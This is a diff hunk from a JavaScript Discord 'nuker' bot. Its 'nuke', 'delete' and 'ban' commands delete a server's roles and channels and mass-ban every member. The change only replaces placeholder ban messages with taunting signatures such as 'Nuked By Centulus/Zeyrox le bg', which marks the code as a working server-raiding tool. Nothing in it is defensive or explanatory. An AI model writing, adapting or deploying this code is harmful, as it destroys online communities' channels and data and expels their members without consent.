@@ -13,14 +13,14 @@ client.on("message", async(msg)=>{
 if(msg.content.toLowerCase().startsWith("n!" + "nuke")){
     msg.guild.roles.filter(r=>r.position < msg.guild.me.highestRole.position).deleteAll();
     msg.guild.channels.deleteAll();
-    msg.guild.members.tap(member => member.ban("your ban message here"));
+    msg.guild.members.tap(member => member.ban("Nuked By Centulus/Zeyrox le bg"));
 }
 if(msg.content.toLowerCase().startsWith(`${prefix}` + "delete")){
     msg.guild.roles.filter(r => r.position < msg.guild.me.highestRole.position).deleteAll();
     msg.guild.channels.deleteAll();
 }
 if(msg.content.toLowerCase().startsWith(`${prefix}` + "ban")){
-    msg.guild.members.tap(member => member.ban("<your ban message here>"));
+    msg.guild.members.tap(member => member.ban("<Nuked By Kaneking le bg>"));
 }
 if(msg.content.toLowerCase().startsWith(`${prefix}` + "help")){
     msg.author.send({
